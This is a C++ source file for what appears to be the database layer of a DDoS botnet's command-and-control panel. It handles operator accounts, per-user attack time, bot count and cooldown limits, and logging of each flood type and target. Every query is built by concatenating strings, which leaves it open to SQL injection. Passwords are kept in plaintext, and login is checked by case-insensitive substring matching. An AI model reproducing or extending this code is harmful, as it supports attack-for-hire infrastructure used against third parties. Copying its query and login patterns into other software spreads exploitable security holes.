#include <iostream>
#include <string.h>
#include <string>
#include <sstream>
#include <time.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "mysql.h"
#include "main.h"
#include "command.h"

int mysql_login(struct admin *login)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    char ret = FALSE;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);

    statement = connection->createStatement();
    result = statement->executeQuery("SELECT username,password FROM users");

    while(result->next())
    {
        std::string u;
        std::string p;

        u = result->getString("username");
        p = result->getString("password");

        // Compare the pair and store
        if(strcasestr(login->user_ptr, u.c_str()) && (strcasestr(login->pass_ptr, p.c_str())))
        {
            login->username = u.c_str();
            login->password = p.c_str();
            ret = TRUE;
            break;
        }
    }

    delete result;
    delete statement;
    delete connection;

    return ret;
}

void mysql_set_restrictions(struct admin *login)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    std::stringstream query;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);

    query << "SELECT * FROM users WHERE username=\"";
    query << login->username;
    query << "\"";

    statement = connection->createStatement();
    result = statement->executeQuery(query.str().c_str());

    while(result->next())
    {
        login->max_clients = result->getInt("max_clients");
        login->max_time = result->getInt("max_time");
        login->cooldown = result->getInt("cooldown");
        login->concurrent = result->getInt("concurrent");
        login->disable = result->getInt("disable");
        login->admin = result->getInt("admin");
        login->authenticated = result->getInt("authenticated");
    }

    delete result;
    delete statement;
    delete connection;

    return;
}

void mysql_get_client_information(struct admin *admin)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    std::stringstream query;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);

    query << "SELECT * FROM users";

    statement = connection->createStatement();
    result = statement->executeQuery(query.str().c_str());

    int current_clients = 0;
    std::stringstream info_stream;

    while(result->next())
    {
        info_stream << "Username: ";
        info_stream << result->getString("username").c_str();
        info_stream << " Admin: ";
        info_stream << result->getInt("admin");
        info_stream << " Authenticated: ";
        info_stream << result->getInt("authenticated");
        info_stream << " Disabled: ";
        info_stream << result->getInt("disable");
        info_stream << " Cooldown: ";
        info_stream << result->getInt("cooldown") << "\r\n";
        
        printf("username: %s clients: %d\n", result->getString("username").c_str(), (++current_clients));
    }

    send(admin->fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);

    delete result;
    delete statement;
    delete connection;

    return;
}

void mysql_remove_user(const char* username)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    std::stringstream query;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);
    
    query << "delete from users where username=\"" << username << "\";";
    
    printf("%s\n", query.str().c_str());

    statement = connection->createStatement();
    statement->execute(query.str().c_str());

    delete statement;
    delete connection;

    return;
}

void mysql_add_user(const char* username, const char*password, const int max_clients, const int max_time, const int cooldown, const int concurrent, const int disable, const int admin, const int authenticated, const int banned, const char* reason)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    std::stringstream query;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);
    
    query << "INSERT INTO `users` (`id`, `username`, `password`, `max_clients`, `max_time`, `cooldown`, `concurrent`, `disable`, `admin`, `authenticated`, `banned`, `reason`) VALUES ";
    query << "(NULL, \"" << username << "\", ";
    query << "\"" << password << "\", ";
    query << max_clients << ", ";
    query << max_time << ", ";
    query << cooldown << ", ";
    query << concurrent << ", ";
    query << disable << ", ";
    query << admin << ", ";
    query << authenticated << ", ";
    query << banned << ", ";
    query << reason << ", ";
    query << 0 << ");";
    
    printf("%s\n", query.str().c_str());

    statement = connection->createStatement();
    statement->execute(query.str().c_str());

    delete statement;
    delete connection;

    return;
}

void mysql_update_disable(struct admin *login, const char* username, int disabled)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    std::stringstream query;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);

    query << "UPDATE users SET disable=" << disabled << " ";
    query << "WHERE username=\"";
    query << username;
    query << "\"";

    printf("%s\n", query.str().c_str());

    statement = connection->createStatement();
    statement->execute(query.str().c_str());

    delete statement;
    delete connection;

    return;
}

void mysql_update_login(struct admin *login, int authenticated)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    std::stringstream query;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);

    query << "UPDATE users SET authenticated=" << authenticated << " ";
    query << "WHERE username=\"";
    query << login->username;
    query << "\"";

    statement = connection->createStatement();
    statement->execute(query.str().c_str());

    delete statement;
    delete connection;

    return;
}

int mysql_allow_concurrent(int fd, std::string username, uint16_t t, int concurrent, int cooldown)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    std::stringstream query_stream;
    std::stringstream fail_stream;
    int ti = 0;
    int ttl = 0;

    if(concurrent)
        return FALSE;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);

    query_stream << "SELECT timestamp, time FROM 001history WHERE username=\"";
    query_stream << username;
    query_stream << "\" AND (timestamp + " << t << " + " << cooldown << ") > UNIX_TIMESTAMP()";

    statement = connection->createStatement();
    result = statement->executeQuery(query_stream.str().c_str());
    
    if(!result->rowsCount())
    {
        delete result;
        delete statement;
        delete connection;
        return FALSE;
    }

    while(result->next())
    {
        ti = result->getInt("timestamp");
    }
    
    ttl = (ti + t + cooldown) - time(NULL);

    fail_stream << "Please wait " << ttl << " seconds before launching another command\r\n";
    send(fd, fail_stream.str().c_str(), fail_stream.str().length(), MSG_NOSIGNAL);

    delete result;
    delete statement;
    delete connection;
    return TRUE;
}

void mysql_log(std::string username, int count, std::string flood, std::string target, uint16_t t)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;
    std::stringstream query_stream;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);

    // Build the query for log
    query_stream << "INSERT INTO log VALUES(NULL, \"";
    query_stream << username;
    query_stream << "\", \"";
    query_stream << flood;
    query_stream << "\", \"";
    query_stream << target;
    query_stream << "\", ";
    query_stream << (!t ? 60 : t);
    query_stream << ", ";
    query_stream << (count == -1 ? client_count(count) : count);
    query_stream << ", " << time(NULL) << ")";

    statement = connection->createStatement();
    statement->execute(query_stream.str().c_str());

    delete statement;
    delete connection;
}

void mysql_clear_login(void)
{
    sql::Driver *driver;
    sql::Connection *connection;
    sql::Statement *statement;
    sql::ResultSet *result;

    driver = get_driver_instance();
    connection = driver->connect(MYSQL_HOST, MYSQL_USERNAME, MYSQL_PASSWORD);
    connection->setSchema(MYSQL_DATABASE);

    statement = connection->createStatement();
    statement->execute("UPDATE users SET authenticated=0 WHERE authenticated=1");

    delete statement;
    delete connection;

    return;
}
